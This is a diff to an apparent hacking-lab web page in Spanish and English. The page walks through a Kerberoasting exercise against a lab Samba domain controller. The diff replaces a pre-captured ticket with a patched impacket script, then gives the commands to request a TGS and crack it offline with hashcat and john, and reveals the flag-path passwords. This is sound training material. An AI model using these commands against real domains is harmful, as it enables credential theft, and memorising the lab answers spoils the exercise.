@@ -14,16 +14,18 @@
 
   <div class="hl-card mb-4">
     <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este Domain Controller</h3>
-    <p class="text-sm text-gray-600 dark:text-gray-400">El KDC embebido de Samba no siempre completa el intercambio TGS-REQ/TGS-REP que <code>impacket-GetUserSPNs</code> necesita, aunque puede enumerar perfectamente los SPN por LDAP (eso sí funciona). Los comandos de abajo son exactamente los que usarías contra un Domain Controller Windows real. Para el ejercicio de <em>cracking</em>, el ticket ya ha sido "capturado" y publicado en <code>//{{ ad_dc_host }}/public/captured_tgs.txt</code> — es un ticket válido y crackeable generado con las mismas primitivas criptográficas de Kerberos.</p>
+    <p class="text-sm text-gray-600 dark:text-gray-400"><code>impacket-GetUserSPNs</code> tal cual falla contra este DC por dos bugs distintos: (1) su enumeración LDAP automática usa el bind NTLM/Sicily que Samba no implementa (ver AD 02); y (2), aunque te lo saltes, el TGS-REQ que pide el ticket de servicio revienta con <code>KRB_AP_ERR_INAPP_CKSUM</code> porque impacket no envía el checksum keyed que el KDC de Samba exige en el Authenticator (RFC 4120 §5.5.1) — algo que Windows recibe casi siempre de sus propios clientes, por eso el bug de impacket pasa desapercibido en producción. <strong>Root cause identificado y arreglado</strong>: descarga <code>GetUserSPNs_fixed.py</code> del share <code>public</code> — pide el TGS con ese checksum añadido y produce un hash <strong>real, obtenido en vivo</strong>, no uno pre-capturado.</p>
   </div>
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
-    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Descargar el ticket "capturado"
-smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_tgs.txt'
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Descargar el script que arregla el TGS-REQ contra este DC
+smbclient -N //{{ ad_dc_ip }}/public -c 'get GetUserSPNs_fixed.py'
 
-# Crackear offline
-hashcat -m 13100 captured_tgs.txt /usr/share/wordlists/rockyou.txt</pre>
+# Pedir el TGS de verdad y crackearlo
+python3 GetUserSPNs_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
+  -spn 'MSSQLSvc/{{ ad_dc_fqdn }}:1433' -dc-ip {{ ad_dc_ip }} -outputfile tgs.hash
+hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt</pre>
   </div>
 </div>
 
@@ -42,23 +44,26 @@ hashcat -m 13100 captured_tgs.txt /usr/share/wordlists/rockyou.txt</pre>
 MSSQLSvc/{{ ad_dc_fqdn }}:1433              svc.mssql
 HTTP/web.{{ ad_realm_lower }}               svc.delegate</pre>
 
-    <h3>3 · Solicitar los tickets (comando real, contra Windows funciona así)</h3>
+    <h3>3 · Solicitar el ticket de verdad (funciona en vivo, no es una captura)</h3>
     <pre>impacket-GetUserSPNs '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
   -dc-ip {{ ad_dc_ip }} -request -outputfile tgs.hash
+# [-] Kerberos SessionError: KRB_AP_ERR_INAPP_CKSUM(Inappropriate type of checksum in message)</pre>
+    <p><strong>Root cause:</strong> el Authenticator que <code>getKerberosTGS()</code> de impacket construye para el TGS-REQ nunca incluye el campo <code>cksum</code>. RFC 4120 §5.5.1 define ese checksum como un <em>keyed checksum</em> (key usage 6) sobre la codificación de <code>KDC-REQ-BODY</code>, calculado con la session key del TGT. Windows AD lo recibe de sus propios clientes casi siempre, así que nunca notó que faltaba — pero el KDC de Samba lo exige de verdad, y al no recibirlo responde <code>KRB_AP_ERR_INAPP_CKSUM</code>. Confirmado en vivo con una petición TGS-REQ cruda añadiendo ese checksum: el KDC responde con un TGS-REP perfectamente válido.</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get GetUserSPNs_fixed.py'
 
-head -c 120 tgs.hash
-# $krb5tgs$23$*svc.mssql$&#123;{{ ad_realm }}&#125;$MSSQLSvc/...*$a1b2...</pre>
-    <p><strong>Nota sobre este laboratorio:</strong> el TGS-REQ del KDC de Samba AD DC no siempre completa el intercambio que <code>impacket-GetUserSPNs</code> necesita (limitación conocida de la implementación de Samba frente a un Domain Controller Windows real). Si el comando anterior no produce un hash, descarga el ya "capturado":</p>
-    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_tgs.txt'
-cat captured_tgs.txt
+python3 GetUserSPNs_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
+  -spn 'MSSQLSvc/{{ ad_dc_fqdn }}:1433' -dc-ip {{ ad_dc_ip }} -outputfile tgs.hash
+
+cat tgs.hash
 # $krb5tgs$23$*svc.readonly${{ ad_realm }}$MSSQLSvc/...*$...</pre>
+    <p>El hash resultante es 100% real (se obtiene del TGS-REP genuino que devuelve el KDC), no uno "capturado" de antemano.</p>
 
     <h3>4 · Crackear offline</h3>
     <pre># hashcat (modo 13100 = Kerberos 5 TGS-REP etype 23)
-hashcat -m 13100 captured_tgs.txt /usr/share/wordlists/rockyou.txt --force
+hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --force
 
 # john
-john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt captured_tgs.txt</pre>
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash</pre>
     <p>La contraseña recuperada es <code>ranger</code> (la de <code>svc.mssql</code>). Guárdala: también existe <code>svc.delegate : iloveyou1</code>, que usarás en el lab AD 14.</p>
 
     <h3>5 · Capturar la flag</h3>
@@ -98,23 +103,26 @@ cat flag-ad-05.txt</pre>
 MSSQLSvc/{{ ad_dc_fqdn }}:1433              svc.mssql
 HTTP/web.{{ ad_realm_lower }}               svc.delegate</pre>
 
-    <h3>3 · Request the tickets (real command, works exactly like this against Windows)</h3>
+    <h3>3 · Request the ticket for real (this works live, not a capture)</h3>
     <pre>impacket-GetUserSPNs '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
   -dc-ip {{ ad_dc_ip }} -request -outputfile tgs.hash
+# [-] Kerberos SessionError: KRB_AP_ERR_INAPP_CKSUM(Inappropriate type of checksum in message)</pre>
+    <p><strong>Root cause:</strong> the Authenticator that impacket's <code>getKerberosTGS()</code> builds for the TGS-REQ never includes the <code>cksum</code> field. RFC 4120 §5.5.1 defines that checksum as a <em>keyed checksum</em> (key usage 6) over the encoding of <code>KDC-REQ-BODY</code>, computed with the TGT's session key. Windows AD almost always gets it from its own clients, so it never noticed it was missing — but Samba's KDC genuinely requires it, and without it responds <code>KRB_AP_ERR_INAPP_CKSUM</code>. Confirmed live by sending a raw TGS-REQ with that checksum added: the KDC replies with a perfectly valid TGS-REP.</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get GetUserSPNs_fixed.py'
 
-head -c 120 tgs.hash
-# $krb5tgs$23$*svc.mssql$&#123;{{ ad_realm }}&#125;$MSSQLSvc/...*$a1b2...</pre>
-    <p><strong>Note about this lab:</strong> Samba AD DC's TGS-REQ handling does not always complete the exchange <code>impacket-GetUserSPNs</code> needs (a known limitation of Samba's implementation versus a real Windows Domain Controller). If the command above doesn't produce a hash, download the already-"captured" one:</p>
-    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_tgs.txt'
-cat captured_tgs.txt
+python3 GetUserSPNs_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
+  -spn 'MSSQLSvc/{{ ad_dc_fqdn }}:1433' -dc-ip {{ ad_dc_ip }} -outputfile tgs.hash
+
+cat tgs.hash
 # $krb5tgs$23$*svc.readonly${{ ad_realm }}$MSSQLSvc/...*$...</pre>
+    <p>The resulting hash is 100% real (it comes from the genuine TGS-REP the KDC returns), not a pre-"captured" one.</p>
 
     <h3>4 · Crack offline</h3>
     <pre># hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
-hashcat -m 13100 captured_tgs.txt /usr/share/wordlists/rockyou.txt --force
+hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt --force
 
 # john
-john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt captured_tgs.txt</pre>
+john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash</pre>
     <p>The recovered password is <code>ranger</code> (for <code>svc.mssql</code>). Keep it — there is also <code>svc.delegate : iloveyou1</code>, which you will need in lab AD 14.</p>
 
     <h3>5 · Capture the flag</h3>
